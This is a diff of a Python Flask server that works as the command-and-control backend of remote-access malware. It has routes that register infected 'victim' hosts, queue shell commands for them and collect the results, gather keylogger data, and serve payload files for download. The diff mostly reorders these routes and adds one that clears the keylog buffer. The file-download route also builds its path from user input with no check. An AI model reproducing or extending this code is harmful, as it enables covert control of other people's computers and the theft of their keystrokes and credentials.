@@ -25,61 +25,7 @@ def send_command(name, ip, command):
   
   return 1
 
-# server handshake to keep track of each host
-@app.route('/handshake', methods = ['POST'])
-def handshake():
-  global hosts
-  key = (request.remote_addr, request.form['name'])
-  hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'status' : 'Down', 'log' : [''], 'command_result' : ''}
-  hosts[key]['lock'].acquire()
-  return 'Request accepted', 200
-
-# the download route for the download command
-@app.route('/download', methods = ['POST'])
-def download():
-  file = request.form['file']
-  path = './resources/' + file
-  if os.path.exists(path):
-    return send_file(path, as_attachment = True)
-  else:
-    return 'File not found', 404
-
-# the client is waiting here for the commands
-@app.route('/ready', methods = ['POST'])
-def timeout():
-  global hosts
-  key = (request.remote_addr, request.form['name'])
-
-  # the host blocks until the command is ready
-  hosts[key]['lock'].acquire()
-  
-  # when the mutex is unlocked the command is sent to the host
-  return hosts[key]['command'], 200
-
-@app.route('/pong', methods = ['POST'])
-def pong():
-  global hosts
-
-  # this is where hosts can send their ping responses 
-  # after a response the host status will be set
-  key = (request.remote_addr, request.form['name'])
-  hosts[key]['status'] = 'Up'
-
-  return 'Pong sent.', 200
-
-@app.route('/log', methods = ['POST'])
-def log_post():
-  global hosts
-  
-  # this is where the host can send it's keylog data
-  key = (request.remote_addr, request.form['name'])
-  hosts[key]['log'].append(request.form['key'])
-
-  return 'Ok', 200
-
-
-
-#interface routes
+# interface routes
 @app.route('/')
 def displayHosts():
   global hosts
@@ -100,26 +46,60 @@ def displayHosts():
 
   return render_template('index.html', keys = keys)
 
-@app.route('/send', methods = ['GET'])
-def send_form():
+
+# server handshake to keep track of each host
+@app.route('/handshake', methods = ['POST'])
+def handshake():
+  global hosts
+  key = (request.remote_addr, request.form['name'])
+  hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'status' : 'Down', 'log' : [''], 'command_result' : ''}
+  hosts[key]['lock'].acquire()
+  return 'Request accepted', 200
+
+@app.route('/pong', methods = ['POST'])
+def pong():
   global hosts
 
-  # this is for the hacker interface
-  name = request.args.get('name')
-  ip = request.args.get('ip')
-  
-  return render_template('form.html', name = name, ip = ip)
+  # this is where hosts can send their ping responses 
+  # after a response the host status will be set
+  key = (request.remote_addr, request.form['name'])
+  hosts[key]['status'] = 'Up'
 
+  return 'Pong sent.', 200
+
+# the client is waiting here for the commands
+@app.route('/ready', methods = ['POST'])
+def timeout():
+  global hosts
+  key = (request.remote_addr, request.form['name'])
+
+  # the host blocks until the command is ready
+  hosts[key]['lock'].acquire()
+  
+  # when the mutex is unlocked the command is sent to the host
+  return hosts[key]['command'], 200
+
+# this is for the hacker interface
+# @app.route('/send', methods = ['GET'])
+# def send_form():
+#   global hosts
+
+#   name = request.args.get('name')
+#   ip = request.args.get('ip')
+  
+#   return render_template('form.html', name = name, ip = ip)
+
+# this is for the general interface where you can pick different tools to control one victim
 @app.route('/toolkit', methods = ['GET'])
 def show_toolkit():
   global hosts
 
-  # this is for the hacker interface
   name = request.args.get('name')
   ip = request.args.get('ip')
 
   return render_template('toolkit.html', name = name, ip = ip)
 
+# this route is for sending data (especially commands) to the host
 @app.route('/send', methods = ['POST'])
 def send_process():
   global hosts
@@ -149,27 +129,47 @@ def shell():
       hosts[(ip,name)]['command_result'] = "Command failed!"
     return render_template('command.html', name = name, ip = ip, last_command=command)
     
+
+# this is where the victim will send the command result
 @app.route('/result', methods = ['POST'])
 def result():
   global hosts
   
-  # this is where the victim will send the command result
   key = (request.remote_addr, request.form['name'])
   hosts[key]['command_result'] = request.form['result']
 
   return 'Ok', 200
 
+# this is where the web browser will call for the command result
 @app.route('/getResult', methods = ['POST'])
 def get_result():
   global hosts
   name = request.form['name']
   ip = request.form['ip']
-  # this is where the web browser will call for the command result
   key = (ip, name)
   return hosts[key]['command_result']
 
+# this is where the host can send it's keylog data
+@app.route('/log', methods = ['POST'])
+def log_post():
+  global hosts
+  
+  key = (request.remote_addr, request.form['name'])
+  hosts[key]['log'].append(request.form['key'])
 
-# the route for keylogger control
+  return 'Ok', 200
+
+# this route if for clearing the log buffer
+@app.route('/clearLog', methods = ['POST'])
+def log_clear():
+  global hosts
+  
+  key = (request.remote_addr, request.form['name'])
+  hosts[key]['log'].clear()
+
+  return 'Ok', 200
+
+# this is where the web browser will call for keylog data
 @app.route('/getLog', methods = ['GET', 'POST'])
 def getLog():
   global hosts
@@ -188,7 +188,17 @@ def getLog():
   
   return "Method not allowed", 403
 
-#route to the file uploading interface
+# the download route for the download command
+@app.route('/download', methods = ['POST'])
+def download():
+  file = request.form['file']
+  path = './resources/' + file
+  if os.path.exists(path):
+    return send_file(path, as_attachment = True)
+  else:
+    return 'File not found', 404
+
+# route to the file uploading interface
 @app.route('/upload', methods = ['GET'])
 def upload():
   global hosts
